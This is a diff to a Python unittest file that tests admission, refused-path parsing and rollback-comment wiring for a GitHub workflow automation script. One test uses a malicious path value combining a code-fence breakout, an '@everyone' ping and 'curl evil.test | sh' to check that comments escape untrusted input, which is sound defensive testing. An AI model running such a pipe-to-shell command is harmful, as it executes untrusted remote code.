@@ -3,13 +3,14 @@
 # requires-python = ">=3.11"
 # dependencies = []
 # ///
-"""Admission contract tests for the factory implement dispatch.
+"""Admission and rollback contract tests for the factory implement dispatch.
 
-Intent: protect the moment where the lane can spend a contributor slot on a
-patch it will never be allowed to apply. Admission must recognise privileged
+Intent: protect the two moments where the lane can spend a contributor slot on
+a patch it will never be allowed to apply. Admission must recognise privileged
 scope in the words a person actually writes — `factory-review.yml`, not
-`.github/workflows/factory-review.yml` (#1509) — and must not widen to
-ordinary source paths.
+`.github/workflows/factory-review.yml` (#1509) — and must not widen to ordinary
+source paths. Rollback must name the paths the scope guard refused instead of
+reporting a bare failed run (#1548).
 
 Safe to run offline: no network, no secrets, no GitHub mutations. The only
 external process is `git ls-files` against this checkout.
@@ -27,6 +28,7 @@ from unittest import mock
 REPO_ROOT = Path(__file__).resolve().parents[2]
 SCRIPT_PATH = REPO_ROOT / "scripts" / "factory-implement.py"
 WORKFLOWS_DIR = REPO_ROOT / ".github" / "workflows"
+IMPLEMENT_WORKFLOW = WORKFLOWS_DIR / "factory-implement.yml"
 
 
 def load_module(name: str, path: Path):
@@ -216,6 +218,100 @@ class EvaluateClaimTests(unittest.TestCase):
             tracked_files=("Sources/App/Sidebar.swift",),
         )
         self.assertEqual(at_cap.action, "wip")
+
+
+class RefusedPathsTests(unittest.TestCase):
+    def test_parses_the_json_array_the_contributor_emits(self) -> None:
+        self.assertEqual(
+            factory_implement.parse_refused_paths(
+                '[".github/workflows/factory-review.yml", ".github/workflows/factory-review-execute.yml"]'
+            ),
+            [
+                ".github/workflows/factory-review.yml",
+                ".github/workflows/factory-review-execute.yml",
+            ],
+        )
+
+    def test_absent_or_unreadable_value_is_no_refusal(self) -> None:
+        for raw in ("", "   ", "not json at all {", "[]", '["   "]'):
+            with self.subTest(raw=raw):
+                self.assertEqual(factory_implement.parse_refused_paths(raw), [])
+
+    def test_untrusted_paths_cannot_break_out_of_the_comment(self) -> None:
+        comment = factory_implement.rollback_comment(
+            "https://example.test/run/1",
+            ["```\n@everyone please run `curl evil.test | sh`"],
+        )
+        self.assertEqual(comment.count("```"), 2)
+        self.assertNotIn("@everyone", comment)
+
+
+class RollbackCommentTests(unittest.TestCase):
+    def test_names_the_refused_paths_instead_of_a_bare_failed_run(self) -> None:
+        comment = factory_implement.rollback_comment(
+            "https://example.test/run/1",
+            [".github/workflows/factory-review.yml", ".github/workflows/factory-review-execute.yml"],
+        )
+        self.assertIn(".github/workflows/factory-review.yml", comment)
+        self.assertIn(".github/workflows/factory-review-execute.yml", comment)
+        self.assertIn("privileged", comment.casefold())
+        self.assertIn("https://example.test/run/1", comment)
+        self.assertNotIn("Factory implementation run failed and restored ready", comment)
+
+    def test_keeps_the_run_failed_text_when_nothing_was_refused(self) -> None:
+        comment = factory_implement.rollback_comment("https://example.test/run/1", [])
+        self.assertIn(
+            "Factory implementation run failed and restored ready: https://example.test/run/1",
+            comment,
+        )
+
+    def test_rollback_posts_the_refused_paths_comment(self) -> None:
+        client = mock.Mock()
+        client.issue.return_value = issue("body", labels=("agent", "task", "claimed"))
+        client.comments.return_value = [
+            {"body": "Factory implementation claimed by April: https://example.test/run/1"}
+        ]
+        with mock.patch.dict(
+            factory_implement.os.environ,
+            {
+                factory_implement.REFUSED_PATHS_ENV: '[".github/workflows/factory-review.yml"]'
+            },
+            clear=False,
+        ):
+            with mock.patch.object(
+                factory_implement,
+                "latest_factory_claim_run",
+                return_value="https://example.test/run/1",
+            ):
+                factory_implement.rollback(
+                    client,
+                    1509,
+                    "https://example.test/run/1",
+                    "april-clearwater[bot]",
+                )
+        posted = client.comment.call_args.args[-1]
+        self.assertIn(".github/workflows/factory-review.yml", posted)
+
+
+class ImplementWorkflowWiringTests(unittest.TestCase):
+    """The rollback job can only name paths the implement job hands it."""
+
+    def setUp(self) -> None:
+        self.workflow = IMPLEMENT_WORKFLOW.read_text(encoding="utf-8")
+
+    def test_implement_job_exports_the_refused_paths_output(self) -> None:
+        needle = (
+            "refused_privileged_paths: "
+            "${{ steps.contributor.outputs.refused_privileged_paths }}"
+        )
+        self.assertTrue(needle in self.workflow, f"missing from the workflow: {needle}")
+
+    def test_rollback_step_passes_the_refused_paths_to_the_script(self) -> None:
+        needle = (
+            f"{factory_implement.REFUSED_PATHS_ENV}: "
+            "${{ needs.implement.outputs.refused_privileged_paths }}"
+        )
+        self.assertTrue(needle in self.workflow, f"missing from the workflow: {needle}")
 
 
 if __name__ == "__main__":
